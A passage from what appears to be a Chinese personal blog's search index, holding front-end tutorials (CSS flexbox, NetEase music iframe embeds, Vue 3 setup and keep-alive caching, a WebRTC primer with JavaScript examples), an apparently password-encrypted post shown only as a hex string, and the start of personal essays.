上的代码了。\n","categories":["工具","杂项"],"tags":["Git","GitHub","Gitee","网络优化","hosts","杂项"]},{"title":"Hexo初体验：第一篇文章的诞生","url":"/posts/649.html","content":"Hexo部署了两个多小时，还不是很会写出格式很规整的文章，但是这个学习是值得的。","categories":["建站","杂项"],"tags":["杂项","Hexo","博客搭建","Markdown"]},{"title":"CSS中height 100%为何不生效？Flexbox布局解决方案","url":"/posts/44550.html","content":"CSS设置height: 100%不生效父元素没有固定高度的时候，子元素设置height: 100%不生效。但是可以通过flexbox布局或者grid布局来让元素自动填充剩余宽度或者高度。\nhtml：\n&lt;div class=&quot;parent&quot;&gt;  &lt;div class=&quot;child&quot;&gt;&lt;/div&gt;&lt;/div&gt;\n\ncss：\n.parent &#123;  display: flex;  flex-direction: column; /* 确保子元素在父元素内垂直排列 */&#125;.child &#123;  flex-grow: 1; /* 让子元素填充剩余空间 */  /* 或者使用 flex: 1; 也可以实现同样的效果 */&#125;\n\n","categories":["前端","CSS"],"tags":["CSS","Flexbox","前端开发","布局问题"]},{"title":"如何在HTML网页中嵌入网易云音乐播放器","url":"/posts/2893.html","content":"表现形式一：单曲播放调用代码：\n&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=100% height=86 src=&quot;http://music.163.com/outchain/player?type=2&amp;id=299757&amp;auto=1&amp;height=66&quot;&gt;&lt;/iframe&gt;\n\n参数说明：\n\n播放器可修改参数：\nwidth=100% #自适应宽度\nheight=86 #根据自己喜好修改\nid=299757 #为歌曲的ID http://music.163.com/#/song?id=299757\nauto=0 #0为不自动播放，1为自动播放\n\n效果图：\n\n表现形式二：列表播放*调用代码：\n&lt;iframe src=&quot;http://music.163.com/outchain/player?type=0&amp;amp;id=34238509&amp;amp;auto=0&amp;amp;height=430&quot; width=&quot;100%&quot; height=&quot;450&quot; frameborder=&quot;no&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot;&gt;&lt;/iframe&gt;\n\n参数说明：\n\n播放器可修改参数：\nwidth=100% #自适应宽度\nheight=450#根据自己喜好修改\nid=34238509#为歌曲列表页的ID ,例如：http://music.163.com/#/playlist?id=34238509\nauto=0 #0为不自动播放，1为自动播放\n\n效果图：\n\nfds\n","categories":["前端","HTML"],"tags":["HTML","iframe","网易云音乐","网页嵌入","前端"]},{"title":"Vue 3 + TypeScript + Vite + Pinia 项目搭建指南","url":"/posts/15671.html","content":"前置准备插件安装\nvolar\nTS（volar）\n\n环境安装\nnode.js 16 (17之后使用openssl v3导致证书检验严格，出现报错。可以通过参数设置使用传统验证方式)\nnvm作为node.js环境管理\n\n创建项目npm init vue@latest\n\n\n","categories":["前端","Vue"],"tags":["前端","Vue3","TypeScript","Vite","Pinia"]},{"title":"Vue 3 开发实用资源推荐：优秀库与工具","url":"/posts/91.html","content":"\nVueUse\n\nvs code插件\nJSON2TS json生成ts代码\n\nCss查阅资料\n[Css语法查询-英文]: https://cssreference.io/    “cssreference.io”\n\n","categories":["前端","Vue"],"tags":["Vue3","VueUse","前端工具","VSCode"]},{"title":"WebRTC实时音视频通话技术入门指南","url":"/posts/35158.html","content":"WebRTC介绍WebRTC 由用于 Web 实时通信的 JavaScript API 和一组通信协议构成，支持网络上的任何已连接设备成为 Web 上潜在的通信端点。WebRTC 已成为线上通信及协作服务的基石。\n2021 年 1 月 26 日，万维网联盟（W3C）和互联网工程任务组（IETF）宣布，Web 实时支持多种服务的通信（WebRTC）现在已成为官方标准，可将音频和视频通信带到 Web 上的任何位置。\nW3C也正在研究将WebRTC运用到物联网设备、会议视频加密、机器学习实时处理音视频等方面，所以学习和掌握WebRTC是很有必要，关注前沿技术有助于我们提升自己，也能将更优秀的方案运用到我们的项目当中。\nWebRTC 标准文档\nWebRTC中文网\nWebRTC架构\n如上图WebRTC的框架包含视频解密编码等，从开发者的角度，初步学习只需要关注紫色的实线框部分，即通过调用Web API实现通信功能。目前FireFox、Chrome等主流浏览器都集成了WebRTC的API，绿色和蓝色实线框部分都属于浏览器厂商需要关注的内容，而蓝色虚线框部分则是服务器厂商需要关注的部分。\n关于WebRTC架构的Session管理层、C++ API层、音视频编码层等具体技术，这里就不详细介绍了。\nWebRTC通信层原理介绍实时传输安全协议SRTP\n所谓SRTP，即安全实时传输协议(Secure Real-time Transport Protocol)，其是在实时传输协议(Real-time Transport Protocol)基础上所定义的一个协议，旨在为单播和多播应用程序中的实时传输协议的数据提供加密、消息认证、完整性保证和重放保护。\n\n媒体协商SDP媒体协商是通过对比音视频通信双方所支持的协议，在建立通信之前选择双方或者多方都支持的通信协议。\n\n举例：A端支持VP8编码协议和H.264协议(mp4)，B端支持VP9协议和H.264协议，那么两者需要建立通信，只能选用H.264进行视频编码解码。\n\n网络协商Candidate建立端到端通信的双方，需要能够进行IP通信协议的支持，构建持久化连接。当双方其中一方不满足条件，则无法建立连接。常见两种通信方案STUN和TURN。STUN和TURN服务器可由开源项目cotum构建。\nSTUN当通信双方都具备公网IP和通信端口时，能够建立P2P通信网络，媒体流传输按照P2P方式传输，通信质量只与通信双方的带宽有关。\n很多场景不具备构建P2P网络的条件，当通信一端处于局域网内，不具备公网IP，或者同IP下端口资源分配完毕，无法提供通信端口时，STUN无法构建P2P网络通信。NAT无法成功分配IP的情况不少见。\nTURNTURN是STUN/RFC5389的一个扩展，主要提供了Replay功能。如果终端在NAT之后，无法进行对等的通信直接通信，这是就可以通过公网服务器作为中继，对数据进行一个转发。该转发协议被称为TURN协议。\n\n可参考VPN架构、MQTT架构理解。\n\nICEICE是一个框架，该框架整合了STUN和TURN协议。开源项目cotum同样集成了STUN和TURN协议。\n信令服务器(Singnal Server)&lt;–媒体协商+网络协商上面讲解了构建实时音视频通信通道的协商内容，这个协商过程就需要通过信令服务器进行数据交互，转发对方的媒体信息和网络信息。\n\n举个例子：A端和B端开始视频通话之前，需要在客户端APP/网站WEB向对方提交通话请求并发送媒体协商和网络协商的数据，由服务器转发协商数据到对方终端，双方才互有对方的信息，构建音视频通信通道。这个APP/WEB就是信令服务器。\n\n因此信令服务器是不局限于开发语言、设备类型、应用类型的。\nsequenceDiagram \n# 准备连接\nPeer A-&gt;&gt;Singnal Server: connect \nPeer B-&gt;&gt;Singnal Server: connect\n# 发送媒体协商，其实已经开始Nat，这里省略\nPeer A-&gt;&gt;Singnal Server: Send Offer SDP\nSingnal Server-&gt;&gt;Peer B: Replay Offer SDP\nPeer B-&gt;&gt;Singnal Server: Send Answer SDP\nSingnal Server-&gt;&gt;Peer A: Replay Answer SDP\n# 媒体协商成功，进行网络协商，向中继服务器连接，如果STUN运行则返回到响应信息里面，TURN亦然\nPeer A-&gt;&gt;TURN Server: ICE Request\nTURN Server--&gt;&gt;Peer A: onIceCandidate\n# 向B端发送网络协商信息\nPeer A-&gt;&gt;Singnal Server: Send ICE Candidate\nSingnal Server-&gt;&gt;Peer B: Replay ICE Candidate\nPeer B-&gt;&gt;Peer B: AddIceCandidate\n# B端向中继服务器连接，获取网络协商信息\nPeer B-&gt;&gt;TURN Server: ICE Request\nTURN Server--&gt;&gt;Peer B: onIceCandidate\n# 向A端发送网络协商信息\nPeer B-&gt;&gt;Singnal Server: Send ICE Candidate\nSingnal Server-&gt;&gt;Peer A: Replay ICE Candidate\nPeer A-&gt;&gt;Peer A: AddIceCandidate\n\n# 发送流媒体\nPeer A-&gt;&gt;Peer B: Send Media\nPeer A-&gt;&gt;Peer A: onAddStream\nPeer B-&gt;&gt;Peer B: onAddStream\nPeer B-&gt;&gt;Peer A: Send Media\n\n\nWeb API基础API\nRTCPeerConnection接口代表一个由本地计算机到远端的 WebRTC 连接。该接口提供了创建，保持，监控，关闭连接的方法的实现。\nRTCPeerConnection.createOffer()创建SDP offer信息的函数。\nRTCPeerConnection.setLocalDescription() 设置本地 SDP 描述信息。\nRTCPeerConnection.setRemoteDescription() 设置远程 SDP 描述信息，即对方的SDP信息。\nRTCPeerConnection.createAnswer() 创建SDP answer信息的函数。\nRTCIceCandidate() 构建ICE的网络信息对象。\nRTCPeerConnection.addIceCandidate() 添加对方的ICECandidate信息。\n\n\nWeb MDN强烈建议使用Adapter.js补充库。以确保网站或 Web 应用程序的兼容性。\n\n打开麦克风和摄像头目前主流的浏览器都支持了getUserMedia获取媒体流，具体API和属性查询MDN，不进行赘述。\nnavigator.mediaDevices.getUserMedia(&#123;    video: true,    audio: true  &#125;).then(stream =&gt; &#123;    // do something.    // VideoHtmlElement = stream;  &#125;)\n\n创建RTC连接const _pc = new RTCPeerConnection(&#123;    iceServers: [      &#123;        urls: [&#x27;stun:stun.stunprotocol.org:3478&#x27;]      &#125;    ]  &#125;)\n\n添加onicecandidate回调函数当RTCPeerConnection生成offer SDP或者生成Answer SDP的时候，会自动向iceServers设置的stun/turn服务器获取nat信息，即ice格式的网络信息。\n需要将获取到的candidate信息和通信对方进行交换，完成P2P连接。\nconst _pc = new RTCPeerConnection(&#123;    iceServers: [      &#123;        urls: [&#x27;stun:stun.stunprotocol.org:3478&#x27;]      &#125;    ]  &#125;)_pc.onicecandidate = e =&gt; &#123;    if (e.candidate) &#123;      // 通过信令服务器交互网络信息      console.log(&#x27;candidate&#x27;, JSON.stringify(e.candidate));    &#125;  &#125;\n\n添加ontrack回调函数当RTCPeerConnection完成握手之后，ontrack回调函数获取对方传输过来的媒体流。在这里处理媒体流。\nconst _pc = new RTCPeerConnection(&#123;    iceServers: [      &#123;        urls: [&#x27;stun:stun.stunprotocol.org:3478&#x27;]      &#125;    ]  &#125;)_pc.onicecandidate = e =&gt; &#123;    if (e.candidate) &#123;      console.log(&#x27;candidate&#x27;, JSON.stringify(e.candidate));    &#125;  &#125;_pc.ontrack = e =&gt; &#123;    // do something.    // VideoHtmlElement = e.streams[0];  &#125;\n\n将本地视频流添加到RTClocalStream来自getUserMedia回调函数。\nlocalStream.getTracks().forEach((track, index) =&gt; &#123;    if (localStream) &#123;      _pc.addTrack(track, localStream)      console.log(&#x27;将本地视频流添加到RTC&#x27;, track);    &#125;  &#125;);\n\n创建SDP offer_pc.createOffer(&#123;    offerToReceiveAudio: true,    offerToReceiveVideo: true  &#125;)    .then((sdp) =&gt; &#123;      console.log(&#x27;Offer&#x27;, JSON.stringify(sdp));      pc.setLocalDescription(sdp);  // 设置成本地描述信息    &#125;).catch((err) =&gt; &#123;      console.log(err);    &#125;);\n\n创建SDP answerpc.createOffer(&#123;    offerToReceiveAudio: true,    offerToReceiveVideo: true  &#125;)    .then((sdp) =&gt; &#123;      console.log(&#x27;Offer&#x27;, JSON.stringify(sdp));      pc.setLocalDescription(sdp); // 设置成本地描述信息    &#125;).catch((err) =&gt; &#123;      console.log(err);    &#125;);\n\n\n注意：这里是模拟双方通信的api操作，详情见DEMO。\n\n设置远程SDP信息const remoteSdp = JSON.parse(remoteDesc.value!.value);_pc.setRemoteDescription(new RTCSessionDescription(remoteSdp));console.log(&#x27;成功设置远程描述信息&#x27;, remoteSdp);\n\n\n手动获取输入的话，会发现有多个IceCandidate，一般优先输入 udp的局域网地址进行本地测试即可。或者全部添加。\n\n内容总结只要完成上面部分的内容，就足够搭建出1v1的视频通信程序，可见WebRTC的使用还是非常方便的。并且WebRTC也是低延迟的第一梯队。\n通过上面的内容学习，可见WebRTC最大的优点，是可以进行端对端通信，这是什么概念呢，对网络不熟悉的朋友可能无法理解。我们平时看直播、听广播、刷抖音都是非端对端通信，而是在中间通过媒体服务器进行推流才能获取内容的，假如服务器瘫痪了，正在接收的音视频也会因此中断。端对端，即P2P则无需中间服务器，直接通信传输，音视频质量只与自身网络质量有关。\n当前WebRTC架构中我们了解到了，WebRTC并非不需要服务器，媒体协商和网络协商都需要信令服务器完成，STUN/TURN服务器则是获取自身的外网通信地址，或者无法P2P时进行转发。\n在本文中主要讲解了基于STUN的1v1 WebRTC通信的原理和实现。而实际应用中，大多数会出现多人通信的场景，比如会议室、游戏语音、你画我猜等。在多人通信中，主要有Mesh、MCU、SFU三种架构，并且各有优缺点，由于WebRTC本身主要是端对端通信的协议，多人通信架构相对传统架构来说，没有长处。\n传统RTMP、RTSP、HLS等推流协议架构成熟，能够轻松应用CDN进行媒体分发，对服务器压力小，支持并发高，能轻松达到千万级同时访问，编码解码压力小，如果是这些传统应用场景，建议还是使用推流协议完成。反之，如果是局域网会议、一对一电话通话、共享屏幕、远程控制、白板共享等网络并发小、需要低延迟、自身宽度条件好的情况，使用WebRTC能够快速开发、并且效果更好。\n关于多人通信的WebRTC结构，下篇文章再介绍了。\n","categories":["前端","WebRTC"],"tags":["实时通信","前端","WebRTC","音视频","P2P","JavaScript"]},{"title":"vue中keep-alive组件的使用","url":"/posts/6962.html","content":"前言&emsp; 在开发中经常有从列表跳到详情页，然后返回详情页的时候需要缓存列表页的状态（比如滚动位置信息），这个时候就需要保存状态，要缓存状态；vue 里提供了 keep-alive 组件用来缓存状态。 &emsp; 可以用以下几种方案解决问题；\n一、利用 meta 标签直接上代码, 1、首先在路由中的 meta 标签中记录 keepAlive 的属性为 true\n  path: &#x27;/classify&#x27;,  name: &#x27;classify&#x27;,  component: () =&gt; import(&#x27;@/views/classify/classify.vue&#x27;),  meta: &#123;    title: &#x27;雷石淘券券&#x27;,    keepAlive: true  &#125;&#125;,\n\n2、在创建 router 实例的时候加上 scrollBehavior 方法\nexport default new Router(&#123;  mode: &quot;history&quot;,  base: process.env.BASE_URL,  routes,  scrollBehavior(to, from, savedPosition) &#123;    if (savedPosition) &#123;      return savedPosition;    &#125; else &#123;      return &#123;        x: 0,        y: 0      &#125;;    &#125;  &#125;&#125;);\n\n3/在需要缓存的 router-view 组件上包裹 keep-alive 组件\n&lt;keep-alive&gt;   &lt;router-view v-if=&#x27;$route.meta.keepAlive&#x27;&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;&lt;router-view v-if=&quot;!$route.meta.keepAlive&quot;&gt;&lt;/router-view&gt;\n\n4、由于有些情况下需要缓存有些情况下不需要缓存，可以在缓存的组件里的路由钩子函数中做判断\nbeforeRouteLeave (to, from, next) &#123;    this.loading = true    if (to.path === &#x27;/goods_detail&#x27;) &#123;      from.meta.keepAlive = true    &#125; else &#123;      from.meta.keepAlive = false     // this.$destroy()    &#125;    next()  &#125;,\n\n&emsp;支持可以支持组件的缓存，但是这种方法有 bug，首先第一次打开页面的时候并不缓存，即第一次从列表页跳到详情页，再回来并没有缓存，后面在进入详情页才会被缓存 &emsp;并且只会缓存第一次进入的状态，不会重新请求数据，如果当页面 A 选中一个分类跳到 B 页面，再从 B 列表页面跳往详情页，此时会缓存这个状态，并且以后再从 A 页面的其他分类跳到 B 页面都不会重新被缓存，以至于每次从详情页返回 B 页面都会跳第一次缓存的状态；当你的项目只有一种状态需要缓存，可以考虑使用这种方法\n二、 使用 include、exclude 属性和 beforeRouteEnter 钩子函数&emsp;首先介绍一下 include 和 exclude vue 文档(https://cn.vuejs.org/v2/api/) 是在 vue2.0 以后新增的属性 include 是需要缓存的组件； exclude 是除了某些组件都缓存； include 和 exclude 属性允许组件有条件地缓存。二者都可以用逗号分隔字符串、正则表达式或一个数组来表示：\n&lt;!-- 逗号分隔字符串 --&gt;&lt;keep-alive include=&quot;a,b&quot;&gt;  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;&lt;/keep-alive&gt;&lt;!-- 正则表达式 (使用 `v-bind`) --&gt;&lt;keep-alive :include=&quot;/a|b/&quot;&gt;  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;&lt;/keep-alive&gt;&lt;!-- 数组 (使用 `v-bind`) --&gt;&lt;keep-alive :include=&quot;[&#x27;a&#x27;, &#x27;b&#x27;]&quot;&gt;  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;&lt;/keep-alive&gt;\n\n&emsp;匹配首先检查组件自身的 name 选项，如果 name 选项不可用，则匹配它的局部注册名称 (父组件 components 选项的键值)。匿名组件不能被匹配。\n&emsp;max 只在 2.5.0 新增，最多可以缓存多少组件实例。一旦这个数字达到了，在新实例被创建之前，已缓存组件中最久没有被访问的实例会被销毁掉。\n&lt;keep-alive :max=&quot;10&quot;&gt;  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;&lt;/keep-alive&gt;\n\nactivated 与 deactivated。&emsp;简单介绍一下在被 keep-alive 包含的组件/路由中，会多出两个生命周期的钩子:activated 与 deactivated。文档：在 2.2.0 及其更高版本中，activated 和 deactivated 将会在 树内的所有嵌套组件中触发。 activated 在组件第一次渲染时会被调用，之后在每次缓存组件被激活时调用。 activated 调用时机： 第一次进入缓存路由/组件，在 mounted 后面，beforeRouteEnter 守卫传给 next 的回调函数之前调用：\nbeforeMount=&gt; 如果你是从别的路由/组件进来(组件销毁 destroyed/或离开缓存 deactivated)=&gt;mounted=&gt; activated 进入缓存组件 =&gt; 执行 beforeRouteEnter 回调\n因为组件被缓存了，再次进入缓存路由/组件时，不会触发这些钩子：// beforeCreate created beforeMount mounted 都不会触发。\ndeactivated：组件被停用(离开路由)时调用使用了 keep-alive 就不会调用 beforeDestroy(组件销毁前钩子)和 destroyed(组件销毁)，因为组件没被销毁，被缓存起来了。这个钩子可以看作 beforeDestroy 的替代，如果你缓存了组件，要在组件销毁的的时候做一些事情，你可以放在这个钩子里。如果你离开了路由，会依次触发：\n组件内的离开当前路由钩子 beforeRouteLeave =&gt; 路由前置守卫 beforeEach =&gt;全局后置钩子 afterEach =&gt; deactivated 离开缓存组件 =&gt; activated 进入缓存组件(如果你进入的也是缓存路由\n项目中缓存使用方法： 1、在创建的 router 对象上加 scrollBehavior 方法，同上； 2、将需要缓存的组件加在 include 属性里\n&lt;keep-alive :include=&quot;[&#x27;home&#x27;, &#x27;classify&#x27;, &#x27;search&#x27;]&quot;&gt;      &lt;router-view&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;\n\n3、在 beforeRouteEnter 的 next 回掉函数里，对返回 A 页面不需要缓存的的情况初始化，即将本来需要写在 created 里的东西写在这里；注意一定要将所有的需要初始化的数据要写一遍，不然会有 bug;所以不太推荐\nbeforeRouteEnter (to, from, next) &#123;    next(vm =&gt; &#123;      // 通过 `vm` 访问组件实例      if (from.path !== &#x27;/goods_detail&#x27;) &#123; // 一定是从A进到B页面才刷新        vm.titleText = vm.$route.query.name        vm.categoryUpper = vm.$route.query.categoryUpper        vm.goods = []        vm.page = 1        vm.catsIndex = 0        vm.is_search = false        vm.getCats2()// 是本来写在created里面的各种      &#125;    &#125;)  &#125;\n\n三、使用 include、exclude 属性和 beforeRouteLeave 钩子函数和 vuex (推荐使用)&emsp;第三种方法和第二种相似，不同的地方在于，将需要缓存的组件保存到全局变量，可以在路由的钩子函数里灵活的控制哪些组件需要缓存，那些不需要缓存；跟第二种方法相比，不需要每次再重新初始化数据，但是需要在 vuex 中保存数据；上代码 1、在创建的 router 对象上加 scrollBehavior 方法，同上； 2、将需要缓存的组件加在 include 属性里\n&lt;keep-alive :include=&quot;catch_components&quot;&gt;      &lt;router-view&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;\n\n3、在 store 里加入需要缓存的的组件的变量名，和相应的方法；\nexport default new Vuex.Store(&#123;  state: &#123;    catch_components: []  &#125;,  mutations: &#123;    GET_CATCHE_COMPONENTS(state, data) &#123;      state.catch_components = data;    &#125;  &#125;&#125;);\n\n3、在 beforeRouteLeave 钩子函数里控制需要缓存的组件\nbeforeRouteLeave (to, from, next) &#123; //要在离开该组件的时候控制需要缓存的组件，否则将出现第一次不缓存的情况    this.busy = true    if (to.path === &#x27;/goods_detail&#x27;) &#123; // 去往详情页的时候需要缓存组件，其他情况下不需要缓存      this.$store.commit(&#x27;GET_CATCHE_COMPONENTS&#x27;, [&#x27;home&#x27;])    &#125; else &#123;      this.$store.commit(&#x27;GET_CATCHE_COMPONENTS&#x27;, [])    &#125;    next()  &#125;,\n\n&emsp;以上是在 vue 项目里使用 keep-alive 的情况，网上有一些配合 this.$destroy()方法使用的，但我在使用过程中验证了，并不好用；如果有多个状态，并且有选择的缓存，那么第三个方法是最好的选择；如果你不想用 vuex 使用第二种方法也可以，但需要注意初始化数据。\n&emsp;另外，在我们的项目中遇到路由相同但参数不同的情况组件被复用，不更新的问题，vue 官方给出了 响应路由参数变化\nwatch: &#123;    &#x27;$route&#x27; (to, from) &#123;      document.title = this.$route.query.name      this.getDefault() //根据参数数据响应    &#125;  &#125;,\n","categories":["前端","Vue"],"tags":["Vue"]},{"title":"二合一：番号站+资源站","url":"/posts/36059.html","content":"\n  bee253aadfa4ff37c6d6d73274f657f169f82a775e01842208d35433b89665da879d42ad172fdf0ab23e1a82c5bebf1b1f95d66ab9cea798d5a275e89cd3dcb29c43377ba3def06c8f8c126b479cd6feb4f6b4c9a27adc8cf7665b61a8a35db581f16a9432df39d7d7b0c090c361f07e76af72138602a477c9ba750c9a78df06d8f7f137b43af031f04505dd9acaaf2fb35c3725865d0bcf21f2d716039fafb4603479b7795913775043c1147b1a475d4becddbed48bf2581a64f0c8dc7a3e79cfa139bdac5c045db40c2fe5f8327c47a6f0a053e38512299c7acd859f74c6f63eb49c4035fb7b95816d0263af8337409e33f9575671e66614d01a54a803259da047012a90d1ee6fb9d272dff58d753fadc085af85f90b1eadb29b506ce48cf25d56a1064f1b43f3a20333ba0ac65b6595f2875d08da3c4ca403ebba787cb6b66bacb9468f463d20578faa3a26a88893cfef194e95cc71e5bd062bbea268614b26fa48e66abd639a68bbe49b5a87369f084c796bf2d9ef16b59aa2ae1f2f9b8e8db435354162795d2a92e1c153ddd59e9c1aeb8f85a9e51d64d4002439de85dcbf7e47fcf98aed2a91d9a28f26920117ba89581fd8e182bccdf40dd8d07436a5f8079a7f6d8f132b20b224059587cdf2413da037593237e6e075625c603bdffd7d2feafade6928e0507d5c45262ac0c22252b55211b6e0a3404549633c8c99f4bb830962500b41326af262351e4d7a79c68fbc86cf00b2e5f8a9c4fe634a941a754d76b967188da395a455179a300aa04fc32e1f743efb441b17f1ee56aec4c2c5c4ce955f2413225491f0cdce8ecada3129fe576746c56f78ee9e99c7c59f690fb2ddf684f16e67d03673c00c33d71c9a6e11bffeeaa75967cc1df12595d3d7fc0e69612b49fd0bb2fd4888eb097ba88ee4c759d3e93f4d70e81cb978c6c88353f349b7c2cda22a3816721bf008c6dce95fdc5fba0ab1087914bbe766b63d4369491a48cef3bcac542647aac3ac6e790cdd3858481d5d6c0e0be81ed216028faa411f376aeb1ac3b0e36f8f82ffe32b6463c524ad220ce6164f349d48b31b392206d7780a3a0142f332840495c6ebdf132c419ca4de12081a57fe02bd62e1a9865fae47e3b336b1e275724b930f740fac7d2962dbdbcda9dd56f99a48f409b4b9f3d78de59041325d2015bcbcf05ca0e6a8668ac89797cb8a0c22b2863e508c8962756742500e3d75c091f7542f20e0a5d0439a919e6481d7a81f7e07886366778b47d065ea7132ceb10094436109a0bdca3fe571b8a3f098a7aa7aecb00b830e72b2aa18736fa4aff4ee4e84f02c5cad5d3ae90226623cc7540a27ede936ea94d39a9669ab1f1143cb97493d815e0a0a2cfa0f5b6ba7a71d1584a1041f879f8c83156a076188c2a855e8805cabc1c51cd54f61974bd97a8e0e3ca04d04749898781cbb371c2159cf787928146223e862784c6832a8fc510a6b7fb9f5e6ed675bd3b963b12a102610752d5e527d8cbcbbb0d8d927a98a8c63929f3762a4a4468dedbf112e0ad5b3a3c9f9553b47b41a8a82db2b2f68f18a48a153895ba9dbc92a1924f9c7a9424849684202b7f38d2f11ab0577e539f4235795653d5629f07ef77d792aa92f6f7fb7209143d85ba9fd32c3d100aab89b2425858e642faa1767586d801837bb79a1b4cc656db1826386dd026f80ddf60f860c326281c8ac9256d23cfa76df70fefb6927cb222c43ff4324e45a26df7778d76ef1cc339106003ab11b93a3c578e47a35f976dcd42ed0b3f0dc3502a99cf8f25b9b59ba35bf8d9e32bbef0f45381a3ee8f1320cbf608c81eefae329753124eafdfd2048448e557c264b348f93ea4834c3d8ed3ac6bd708fc1c9ac95bc574b36df345004505abd7bf491215c52b4b5aea91b7eefd4b11573128682a17a960600b8e730298799efd012f1c6e1e93e28f6fd165312377f30b2b053c837273faab21515c67731fe26b76951c63e7a3f7e571fa9e4c3c53036d0372e2aa6e1ee96c1c632f222ccd893ae8f42334f09f5e74cba01c4a060f337eef12465a1f97310730860f693e9e8c496b9c9b1c7a1beca370f1dbd0f9c2f8f6d44138eca59a25894325a175216925b841ba4c05dc02a720b0b250a3f6476a338ccd29c9906abce93c39c45d232ab883a5f2cb29a53af90c63bab6d6ca022c68e45ce52a50813c3a38d78bb17a77a7f769a23d2b6bbe44990293b4483d0faf58bd4b4dfc271f0c8a19f6ebc6cfae5fea53f04fdfb838e4ce5d8d66019a547d17fff5d6706a84b0f043866246b84b945527cf4a1fa1fe06ef179742a7c04a8bd035d78f1ac75e700af7197034d085dee0bcefd8b40357209e22a9c8b55e1c7fe63c12c2a0caabc2e8dea13ba5ba13b3bf586537c87490b0ac57881bab349805292d3b60a0c86cc5209cb1238247b07b019179dd87c0c408c7c948a338d56da982bd7f7d1fc290069cb758421c85610cab0097d809c3843f156b367def9cadae5bdcb2d9e64ceea548cd186bcbbe8513a6f3ade8d17b42a6c285566fb5ad6619bb23ae94204d4bc73fd3839764bcf8bea6bbac531563194a21c0e9f77fba7eeb87a7400348bd122e277f683d3dd9d24f6dbb12269ca06531ca785da11455a55238ba56210ebea8059b608e0499d182af6e8bfc200326f1f608870960d6066e35ab03cacb6e2c2c6fb9040af3946d9842c48fec1ffb848f253ffba9cfbd7b9b55e1e513d9889cd5bbf6a629ecf3bc6ee0692adf3687b12fffedf3ea5305d05fc1d11f2becaa1f1a8e4ba9c4146c415c4f7bdb5ff77d8c9978688da0286d03bab599a703feff208d8e7e2dc8c37048911d98376a2c7126640d019b54fa1431ccd9c16a3ca2d01932101996b7d081bc58aa32d8925a8d56b79abc4a6fae5f60852f646db18f73c2107fca642b3177220afa3ba74cc61bc6bf745977ebe74a9df011aed46bae1585286595bcd4aca6ef17015a46800bc8e47e082a53043aa70b6a04e1072cd1800e799235665a3798bd855df8236fa09c464eb91c64eb0ba74d2a67637e48d2b3525fb93f35e7972d628f653c69dbf5e59c742eba475e3c674fceb6516e8c1515cbc8c5cc6c90711795ab35c39b3f0f8a72102154545e5ccfba418cd40fa9ac7ca716d2c6ec9d44b1f6ac4e85903f7e8df3908e0c7556f7aeb84a3c0292eb1a91cde731fc41d948b488c0afab8ff4830efd677aa348000892dc2ad62805a71681018ebe1d18d4cebdb4290ddfe9b4482f4923b3b64376c7ce416ae140937106e1d2289fdbb7166e3cb72283b504ce9e5c080d32814a41b9010966c982afc8b7dfd8c11aab99321cb768eceb7628814715a19d60d3800839bff56d9824c48ac4110a0c5409da7c3163390a53c14cd3daa1cd6fa72e27e7946312b7bf5431a490af99cdda3dee7ede5ad0364f94809a19a90a8e914b8dce0881122d218933be293cfb019d40a7e0419f77a96d69026a015c19b7c71e3cabdf96976a95288ee48a2c866789a5f187450ca286e5ea5dec336321b01ffc4d12715fd38be6bc4f57cec37ef2ceaa15524a7c253f9d835bce1cb8855c993e8bbec4ef42d28b894e7a404a96e147e822973f2418084eb37e61a024b3a4fcb2537aec2abac510a7f8941df5c8731d890c4b903e76b2dd3feeeb52ce43d5ca7385e290b5c511587938034e4778a15b70f1db9ac04b79ef72f476ae3306bf1bc189c2ad09e838f37be897f0f9232d38b90621417fcd597f37136e1c6a985aef500da6fffad8b9cdc8d1ee70aed4e705986ac8da4eda90270d2d676624385b5bfca83f03e1717c7124a4b55e547244a5cc237dccc08c2b16152fa97de701ef59200cc60a3ae960ce54ee517c1dad6b3e190927863d579e646f18165f33b17159adcba059a9410afaa2a4daf67e255aa1befd5d9eb3baf954918acaf983b46706900d4fc819437e325ad7ec6ebba53f9b92e3fe9dd84cdef169a1392aba88a0df332a951a6929753a9cea002103e1837f54a221a10de10aada8b\n  \n    \n      \n      \n        多年积累，持续更新！！！\n      \n    \n  \n\n","tags":["不为人知"]},{"title":"《她和她的猫》","url":"/posts/44241.html","content":"\n\n\n\n\n如果说《如果猫从世界上消失》中的猫是与母亲的羁绊，那么《她和她的猫》中的猫就是无言的陪伴，是对她的关爱的报恩。\n远处的事物小而模糊，近处的事物清晰可见，回忆也是一样。往昔的回忆模模糊糊，最近的事情则记得清清楚楚。尽管如此，近来总觉得，遥远的往昔，也像刚刚发生过的一样历历在目。\n\n\n\n\n\n","tags":["随笔"]},{"title":"写给我的兄弟","url":"/posts/26337.html","content":"\n\n\n\n也算是昨天的事吧，现在还是半夜，人生、感情真是复杂。\n\n接着昨晚熬夜写代码&emsp;&emsp;一直在赶需求，坐在电脑前码着代码，C 